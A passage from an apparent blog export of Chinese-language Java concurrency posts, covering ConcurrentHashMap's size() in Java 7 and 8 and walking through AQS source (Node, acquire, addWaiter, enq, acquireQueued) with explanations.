<h4 id="size方法"><a href="#size方法" class="headerlink" title="size方法"></a>size方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Try a few times to get accurate count. On failure due to</span></span><br><span class="line">        <span class="comment">// continuous async changes in table, resort to locking.</span></span><br><span class="line">        <span class="keyword">final</span> Segment&lt;K,V&gt;[] segments = <span class="keyword">this</span>.segments;</span><br><span class="line">        <span class="keyword">int</span> size;</span><br><span class="line">        <span class="keyword">boolean</span> overflow; <span class="comment">// true if size overflows 32 bits</span></span><br><span class="line">        <span class="keyword">long</span> sum;         <span class="comment">// sum of modCounts</span></span><br><span class="line">        <span class="keyword">long</span> last = <span class="number">0L</span>;   <span class="comment">// previous sum</span></span><br><span class="line">        <span class="keyword">int</span> retries = -<span class="number">1</span>; <span class="comment">// first iteration isn't retry</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="comment">//达到RETRIES_BEFORE_LOCK</span></span><br><span class="line">                <span class="keyword">if</span> (retries++ == RETRIES_BEFORE_LOCK) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; segments.length; ++j)</span><br><span class="line">                        ensureSegment(j).lock(); <span class="comment">// force creation</span></span><br><span class="line">                &#125;</span><br><span class="line">                sum = <span class="number">0L</span>;</span><br><span class="line">                size = <span class="number">0</span>;</span><br><span class="line">                overflow = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; segments.length; ++j) &#123;</span><br><span class="line">                    Segment&lt;K,V&gt; seg = segmentAt(segments, j);</span><br><span class="line">                    <span class="comment">//遍历计算segment的modCount和count的和</span></span><br><span class="line">                    <span class="keyword">if</span> (seg != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        sum += seg.modCount;</span><br><span class="line">                        <span class="keyword">int</span> c = seg.count;</span><br><span class="line">                        <span class="comment">//是否溢出int范围</span></span><br><span class="line">                        <span class="keyword">if</span> (c &lt; <span class="number">0</span> || (size += c) &lt; <span class="number">0</span>)</span><br><span class="line">                            overflow = <span class="keyword">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//last是上一次的sum值，相等跳出循环</span></span><br><span class="line">                <span class="keyword">if</span> (sum == last)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                last = sum;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//解锁</span></span><br><span class="line">            <span class="keyword">if</span> (retries &gt; RETRIES_BEFORE_LOCK) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; segments.length; ++j)</span><br><span class="line">                    segmentAt(segments, j).unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> overflow ? Integer.MAX_VALUE : size;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Java-8中的ConcurrentHashMap"><a href="#Java-8中的ConcurrentHashMap" class="headerlink" title="Java 8中的ConcurrentHashMap"></a>Java 8中的ConcurrentHashMap</h2><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>Java 8 中去除了Java 7 的segment分段锁，转而使用Node+synchronized+CAS来保证并发安全。</p>
<h3 id="put方法实现-1"><a href="#put方法实现-1" class="headerlink" title="put方法实现"></a>put方法实现</h3><p>ConcurrentHashMap在Java 8 的put步骤如下：</p>
<ol>
<li>根据key的hash值定位到table的首节点first；</li>
<li>如果为null，新增节点，通过cas的方式；</li>
<li>如果不为null，并且，first.hash == -1，说明其他线程正在扩容，参与一起扩容</li>
<li>如果不为null，并且first.hash != -1，Synchronized锁住first节点，判断是链表还是红黑树，遍历插入</li>
</ol>
<h3 id="size方法实现-1"><a href="#size方法实现-1" class="headerlink" title="size方法实现"></a>size方法实现</h3><p>由于没有segment的概念，所以只需要用一个 <code>baseCount</code> 变量来记录ConcurrentHashMap 当前 <code>节点的个数</code>。</p>
<ol>
<li>先尝试通过CAS 修改 <code>baseCount</code></li>
<li>如果多线程竞争激烈，某些线程CAS失败，那就CAS尝试将 <code>CELLSBUSY</code> 置1，成功则可以把 <code>baseCount变化的次数</code> 暂存到一个数组 <code>counterCells</code> 里，后续数组 <code>counterCells</code> 的值会加到 <code>baseCount</code> 中。</li>
<li>如果 <code>CELLSBUSY</code> 置1失败又会反复进行CAS <code>baseCount</code> 和 CAS <code>counterCells</code>数组</li>
</ol>
<h2 id="N句话总结"><a href="#N句话总结" class="headerlink" title="N句话总结"></a>N句话总结</h2><ol>
<li>去除 <code>Segment + HashEntry + Unsafe</code> 的实现，<br> 改为 <code>Synchronized + CAS + Node + Unsafe</code> 的实现<br> 其实 Node 和 HashEntry 的内容一样，但是HashEntry是一个内部类。<br> 用 Synchronized + CAS 代替 Segment ，这样锁的粒度更小了，并且不是每次都要加锁了，CAS尝试失败了再加锁。</li>
<li>put()方法中 初始化数组大小时，1.8不用加锁，因为用了个 <code>sizeCtl</code> 变量，将这个变量置为-1，就表明table正在初始化。</li>
</ol>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/pange1991/article/details/85127013" target="_blank" rel="noopener">ConCurrentHashMap JDK1.7 和 JDK1.8 的区别</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>并发</tag>
        <tag>多线程</tag>
        <tag>ConcurrentHashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>Java AQS 解析</title>
    <url>/2020/03/12/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-12-%E5%A4%9A%E7%BA%BF%E7%A8%8B-04.Java-AQS-%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="AbstractQueuedSynchronizer（AQS）"><a href="#AbstractQueuedSynchronizer（AQS）" class="headerlink" title="AbstractQueuedSynchronizer（AQS）"></a>AbstractQueuedSynchronizer（AQS）</h1><p>Java并发包（JUC）中提供了很多并发工具，这其中，很多我们耳熟能详的并发工具，譬如ReentrangLock、Semaphore，它们的实现都用到了一个共同的基类–<strong>AbstractQueuedSynchronizer</strong>,简称AQS。AQS是一个用来构建锁和同步器的框架，使用AQS能简单且高效地构造出应用广泛的大量的同步器，比如我们提到的ReentrantLock，Semaphore，其他的诸如ReentrantReadWriteLock，SynchronousQueue，FutureTask等等皆是基于AQS的。当然，我们自己也能利用AQS非常轻松容易地构造出符合我们自己需求的同步器。</p>
<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>AQS使用一个int成员变量来表示同步状态，通过内置的FIFO队列来完成获取资源线程的排队工作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">int</span> state;<span class="comment">//共享变量，使用volatile修饰保证线程可见性</span></span><br></pre></td></tr></table></figure>

<p>状态信息通过protected类型的<strong>getState</strong>，<strong>setState</strong>，<strong>compareAndSetState</strong>进行操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getState</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setState</span><span class="params">(<span class="keyword">int</span> newState)</span></span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">compareAndSetState</span><span class="params">(<span class="keyword">int</span> expect, <span class="keyword">int</span> update)</span></span></span><br></pre></td></tr></table></figure>



<p>AQS支持两种同步方式：</p>
<ul>
<li>独占式</li>
<li>共享式</li>
</ul>
<p>这样方便使用者实现不同类型的同步组件，独占式如ReentrantLock，共享式如Semaphore，CountDownLatch，组合式的如ReentrantReadWriteLock。总之，AQS为使用提供了底层支撑，如何组装实现，使用者可以自由发挥。</p>
<p>同步器的设计是基于<strong>模板方法模式</strong>的，一般的使用方式是这样：</p>
<p>　　<strong>1.使用者继承AbstractQueuedSynchronizer并重写指定的方法。（这些重写方法很简单，无非是对于共享资源state的获取和释放）</strong></p>
<p>　　<strong>2.将AQS组合在自定义同步组件的实现中，并调用其模板方法，而这些模板方法会调用使用者重写的方法。</strong></p>
<p>可能需要重新定义的protected method</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//独占模式</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryRelease</span><span class="params">(<span class="keyword">int</span> arg)</span></span>;</span><br><span class="line"><span class="comment">//共享模式</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">tryAcquireShared</span><span class="params">(<span class="keyword">int</span> arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryReleaseShared</span><span class="params">(<span class="keyword">int</span> arg)</span></span>;</span><br><span class="line"><span class="comment">//判断当前线程是否排它持有state</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isHeldExclusively</span><span class="params">()</span>；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//以上方法在AQS中默认实现为throw new UnsupportedOperationException();</span></span></span><br></pre></td></tr></table></figure>

<p>子类可以维护其他状态字段，但是只有使用方法getState、setState和compareAndSetState操纵的原子更新的{int state}值在同步方面被跟踪。AbstractQueuedSynchronizer的子类应该定义为非公共的内部助手类，用于实现其封闭类的同步属性。</p>
<h2 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h2><p>对于使用者来讲，我们无需关心获取资源失败，线程排队，线程阻塞/唤醒等一系列复杂的实现，这些都在AQS中为我们处理好了。我们只需要负责好自己的那个环节就好，也就是获取/释放共享资源state的姿势T_T。很经典的模板方法设计模式的应用，AQS为我们定义好顶级逻辑的骨架，并提取出公用的线程入队列/出队列，阻塞/唤醒等一系列复杂逻辑的实现，将部分简单的可由使用者决定的操作逻辑延迟到子类中去实现即可。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>首先，我们需要去继承AbstractQueuedSynchronizer这个类，然后我们根据我们的需求去重写相应的方法，比如要实现一个独占锁，那就去重写tryAcquire，tryRelease方法，要实现共享锁，就去重写tryAcquireShared，tryReleaseShared；最后，在我们的组件中调用AQS中的模板方法就可以了，而这些模板方法是会调用到我们之前重写的那些方法的。也就是说，我们只需要很小的工作量就可以实现自己的同步组件，重写的那些方法，仅仅是一些简单的对于共享资源state的获取和释放操作，至于像是获取资源失败，线程需要阻塞之类的操作，自然是AQS帮我们完成了。</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>AQS维护了一个共享资源state，通过内置的FIFO队列完成排队的工作。这个队列是一个由Node节点组成的双向量表。AQS分别维护了它的一头一尾两个指针。</p>
<p><img src="https://huhansi.github.io/images/2020-03-12-node-linked-list.png" alt="Node节点组成的双向队列"></p>
<h3 id="独占式"><a href="#独占式" class="headerlink" title="独占式"></a>独占式</h3><h4 id="Node节点"><a href="#Node节点" class="headerlink" title="Node节点"></a>Node节点</h4><p>Node节点是AQS里面的一个静态内部类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">        <span class="comment">/** Marker to indicate a node is waiting in shared mode */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> Node SHARED = <span class="keyword">new</span> Node();</span><br><span class="line">        <span class="comment">/** Marker to indicate a node is waiting in exclusive mode */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> Node EXCLUSIVE = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** waitStatus value to indicate thread has cancelled */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CANCELLED =  <span class="number">1</span>;</span><br><span class="line">        <span class="comment">/** waitStatus value to indicate successor's thread needs unparking */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SIGNAL    = -<span class="number">1</span>;</span><br><span class="line">        <span class="comment">/** waitStatus value to indicate thread is waiting on condition */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CONDITION = -<span class="number">2</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * waitStatus value to indicate the next acquireShared should</span></span><br><span class="line"><span class="comment">         * unconditionally propagate</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PROPAGATE = -<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Status field, taking on only the values:</span></span><br><span class="line"><span class="comment">         *   SIGNAL:     The successor of this node is (or will soon be)</span></span><br><span class="line"><span class="comment">         *               blocked (via park), so the current node must</span></span><br><span class="line"><span class="comment">         *               unpark its successor when it releases or</span></span><br><span class="line"><span class="comment">         *               cancels. To avoid races, acquire methods must</span></span><br><span class="line"><span class="comment">         *               first indicate they need a signal,</span></span><br><span class="line"><span class="comment">         *               then retry the atomic acquire, and then,</span></span><br><span class="line"><span class="comment">         *               on failure, block.</span></span><br><span class="line"><span class="comment">         *   CANCELLED:  This node is cancelled due to timeout or interrupt.</span></span><br><span class="line"><span class="comment">         *               Nodes never leave this state. In particular,</span></span><br><span class="line"><span class="comment">         *               a thread with cancelled node never again blocks.</span></span><br><span class="line"><span class="comment">         *   CONDITION:  This node is currently on a condition queue.</span></span><br><span class="line"><span class="comment">         *               It will not be used as a sync queue node</span></span><br><span class="line"><span class="comment">         *               until transferred, at which time the status</span></span><br><span class="line"><span class="comment">         *               will be set to 0. (Use of this value here has</span></span><br><span class="line"><span class="comment">         *               nothing to do with the other uses of the</span></span><br><span class="line"><span class="comment">         *               field, but simplifies mechanics.)</span></span><br><span class="line"><span class="comment">         *   PROPAGATE:  A releaseShared should be propagated to other</span></span><br><span class="line"><span class="comment">         *               nodes. This is set (for head node only) in</span></span><br><span class="line"><span class="comment">         *               doReleaseShared to ensure propagation</span></span><br><span class="line"><span class="comment">         *               continues, even if other operations have</span></span><br><span class="line"><span class="comment">         *               since intervened.</span></span><br><span class="line"><span class="comment">         *   0:          None of the above</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * The values are arranged numerically to simplify use.</span></span><br><span class="line"><span class="comment">         * Non-negative values mean that a node doesn't need to</span></span><br><span class="line"><span class="comment">         * signal. So, most code doesn't need to check for particular</span></span><br><span class="line"><span class="comment">         * values, just for sign.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * The field is initialized to 0 for normal sync nodes, and</span></span><br><span class="line"><span class="comment">         * CONDITION for condition nodes.  It is modified using CAS</span></span><br><span class="line"><span class="comment">         * (or when possible, unconditional volatile writes).</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">volatile</span> <span class="keyword">int</span> waitStatus;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Link to predecessor node that current node/thread relies on</span></span><br><span class="line"><span class="comment">         * for checking waitStatus. Assigned during enqueuing, and nulled</span></span><br><span class="line"><span class="comment">         * out (for sake of GC) only upon dequeuing.  Also, upon</span></span><br><span class="line"><span class="comment">         * cancellation of a predecessor, we short-circuit while</span></span><br><span class="line"><span class="comment">         * finding a non-cancelled one, which will always exist</span></span><br><span class="line"><span class="comment">         * because the head node is never cancelled: A node becomes</span></span><br><span class="line"><span class="comment">         * head only as a result of successful acquire. A</span></span><br><span class="line"><span class="comment">         * cancelled thread never succeeds in acquiring, and a thread only</span></span><br><span class="line"><span class="comment">         * cancels itself, not any other node.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">volatile</span> Node prev;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Link to the successor node that the current node/thread</span></span><br><span class="line"><span class="comment">         * unparks upon release. Assigned during enqueuing, adjusted</span></span><br><span class="line"><span class="comment">         * when bypassing cancelled predecessors, and nulled out (for</span></span><br><span class="line"><span class="comment">         * sake of GC) when dequeued.  The enq operation does not</span></span><br><span class="line"><span class="comment">         * assign next field of a predecessor until after attachment,</span></span><br><span class="line"><span class="comment">         * so seeing a null next field does not necessarily mean that</span></span><br><span class="line"><span class="comment">         * node is at end of queue. However, if a next field appears</span></span><br><span class="line"><span class="comment">         * to be null, we can scan prev's from the tail to</span></span><br><span class="line"><span class="comment">         * double-check.  The next field of cancelled nodes is set to</span></span><br><span class="line"><span class="comment">         * point to the node itself instead of null, to make life</span></span><br><span class="line"><span class="comment">         * easier for isOnSyncQueue.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">volatile</span> Node next;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * The thread that enqueued this node.  Initialized on</span></span><br><span class="line"><span class="comment">         * construction and nulled out after use.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">volatile</span> Thread thread;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Link to next node waiting on condition, or the special</span></span><br><span class="line"><span class="comment">         * value SHARED.  Because condition queues are accessed only</span></span><br><span class="line"><span class="comment">         * when holding in exclusive mode, we just need a simple</span></span><br><span class="line"><span class="comment">         * linked queue to hold nodes while they are waiting on</span></span><br><span class="line"><span class="comment">         * conditions. They are then transferred to the queue to</span></span><br><span class="line"><span class="comment">         * re-acquire. And because conditions can only be exclusive,</span></span><br><span class="line"><span class="comment">         * we save a field by using special value to indicate shared</span></span><br><span class="line"><span class="comment">         * mode.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Node nextWaiter;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Returns true if node is waiting in shared mode.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">isShared</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> nextWaiter == SHARED;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Returns previous node, or throws NullPointerException if null.</span></span><br><span class="line"><span class="comment">         * Use when predecessor cannot be null.  The null check could</span></span><br><span class="line"><span class="comment">         * be elided, but is present to help the VM.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span> the predecessor of this node</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">final</span> Node <span class="title">predecessor</span><span class="params">()</span> <span class="keyword">throws</span> NullPointerException </span>&#123;</span><br><span class="line">            Node p = prev;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Node() &#123;    <span class="comment">// Used to establish initial head or SHARED marker</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Node(Thread thread, Node mode) &#123;     <span class="comment">// Used by addWaiter</span></span><br><span class="line">            <span class="keyword">this</span>.nextWaiter = mode;</span><br><span class="line">            <span class="keyword">this</span>.thread = thread;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Node(Thread thread, <span class="keyword">int</span> waitStatus) &#123; <span class="comment">// Used by Condition</span></span><br><span class="line">            <span class="keyword">this</span>.waitStatus = waitStatus;</span><br><span class="line">            <span class="keyword">this</span>.thread = thread;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>里面这几个字段是比较重要的</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>CANCELLED</td>
<td>waitStatus取值范围之一</td>
<td>因为超时或者中断，节点会被设置为取消状态，被取消状态的节点不应该去竞争锁，只能保持取消状态不变，不能转为其他状态。处于这种状态的节点会被踢出队列，被GC回收。</td>
</tr>
<tr>
<td>SIGNAL</td>
<td>waitStatus取值范围之一</td>
<td>表示这个节点的继任节点被阻塞了，到时候需要通知它。</td>
</tr>
<tr>
<td>CONDITION</td>
<td>waitStatus取值范围之一</td>
<td>表示这个节点因为等待某个条件而被阻塞</td>
</tr>
<tr>
<td>PROPAGATE</td>
<td>waitStatus取值范围之一</td>
<td>使用在共享模式头结点有可能处于这种状态，表示锁的下一次获取可以无条件传播；</td>
</tr>
<tr>
<td>waitStatus</td>
<td>int</td>
<td>初始值为0，新节点的默认状态</td>
</tr>
<tr>
<td>prev</td>
<td>Node</td>
<td>当前节点的前一个节点</td>
</tr>
<tr>
<td>next</td>
<td>Node</td>
<td>当前节点的继任节点</td>
</tr>
<tr>
<td>thread</td>
<td>Thread</td>
<td>与节点关联的排队中的线程</td>
</tr>
</tbody></table>
<h4 id="获取锁"><a href="#获取锁" class="headerlink" title="获取锁"></a>获取锁</h4><p>接下来我们看看，acquire方法是怎么获取锁的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Acquires in exclusive mode, ignoring interrupts.  Implemented</span></span><br><span class="line"><span class="comment">     * by invoking at least once &#123;<span class="doctag">@link</span> #tryAcquire&#125;,</span></span><br><span class="line"><span class="comment">     * returning on success.  Otherwise the thread is queued, possibly</span></span><br><span class="line"><span class="comment">     * repeatedly blocking and unblocking, invoking &#123;<span class="doctag">@link</span></span></span><br><span class="line"><span class="comment">     * #tryAcquire&#125; until success.  This method can be used</span></span><br><span class="line"><span class="comment">     * to implement method &#123;<span class="doctag">@link</span> Lock#lock&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arg the acquire argument.  This value is conveyed to</span></span><br><span class="line"><span class="comment">     *        &#123;<span class="doctag">@link</span> #tryAcquire&#125; but is otherwise uninterpreted and</span></span><br><span class="line"><span class="comment">     *        can represent anything you like.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">acquire</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!tryAcquire(arg) &amp;&amp;</span><br><span class="line">            acquireQueued(addWaiter(Node.EXCLUSIVE), arg))</span><br><span class="line">            selfInterrupt();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>上述方法主要做以下操作：</p>
<ol>
<li>调用使用者重写的tryAcquire方法，如果返回true，表示获取同步状态成功，直接返回</li>
<li>如果获取同步状态失败，就构造独占式同步节点，通过addWaiter方法将此节点添加到同步队列的尾部</li>
<li>该节点在队列中尝试获取同步状态，如果获取不到，则阻塞节点线程，知道被前驱节点唤醒或者被中断</li>
</ol>
<p>看一下addWaiter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Creates and enqueues node for current thread and given mode.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mode Node.EXCLUSIVE for exclusive, Node.SHARED for shared</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the new node</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">addWaiter</span><span class="params">(Node mode)</span> </span>&#123;</span><br><span class="line">        Node node = <span class="keyword">new</span> Node(Thread.currentThread(), mode);</span><br><span class="line">        <span class="comment">// Try the fast path of enq; backup to full enq on failure</span></span><br><span class="line">        Node pred = tail;</span><br><span class="line">        <span class="keyword">if</span> (pred != <span class="keyword">null</span>) &#123;</span><br><span class="line">            node.prev = pred;</span><br><span class="line">            <span class="keyword">if</span> (compareAndSetTail(pred, node)) &#123;</span><br><span class="line">                pred.next = node;</span><br><span class="line">                <span class="keyword">return</span> node;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        enq(node);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>以CAS方式将当前节点加入到队列的尾部，如果失败了，就进入enq方法。</p>
<p>enq方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Inserts node into queue, initializing if necessary. See picture above.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> node the node to insert</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> node's predecessor</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">enq</span><span class="params">(<span class="keyword">final</span> Node node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            Node t = tail;</span><br><span class="line">            <span class="keyword">if</span> (t == <span class="keyword">null</span>) &#123; <span class="comment">// Must initialize</span></span><br><span class="line">                <span class="keyword">if</span> (compareAndSetHead(<span class="keyword">new</span> Node()))</span><br><span class="line">                    tail = head;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                node.prev = t;</span><br><span class="line">                <span class="keyword">if</span> (compareAndSetTail(t, node)) &#123;</span><br><span class="line">                    t.next = node;</span><br><span class="line">                    <span class="keyword">return</span> t;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>enq中有一个死循环，在这个循环中，一直用CAS方法取设置节点。直到成功为止。</p>
<p>接着我们在看看acquireQueued方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Acquires in exclusive uninterruptible mode for thread already in</span></span><br><span class="line"><span class="comment">     * queue. Used by condition wait methods as well as acquire.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> node the node</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arg the acquire argument</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if interrupted while waiting</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">acquireQueued</span><span class="params">(<span class="keyword">final</span> Node node, <span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> failed = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">boolean</span> interrupted = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="keyword">final</span> Node p = node.predecessor();</span><br><span class="line">                <span class="keyword">if</span> (p == head &amp;&amp; tryAcquire(arg)) &#123;</span><br><span class="line">                    setHead(node);</span><br><span class="line">                    p.next = <span class="keyword">null</span>; <span class="comment">// help GC</span></span><br><span class="line">                    failed = <span class="keyword">false</span>;</span><br><span class="line">                    <span class="keyword">return</span> interrupted;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class="line">                    parkAndCheckInterrupt())</span><br><span class="line">                    interrupted = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (failed)</span><br><span class="line">                cancelAcquire(node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>acquireQueued内部也是一个死循环，只有前驱结点是头结点的结点，也就是老二结点，才有机会去tryAcquire；若tryAcquire成功，表示获取同步状态成功，将此结点设置为头结点；若是非老二结点，或者tryAcquire失败，则进入shouldParkAfterFailedAcquire去判断判断当前线程是否应该阻塞，若可以，调用parkAndCheckInterrupt阻塞当前线程，直到被中断或者被前驱结点唤醒。若还不能休息，继续循环。</p>
<p><strong>shouldParkAfterFailedAcquire</strong></p>
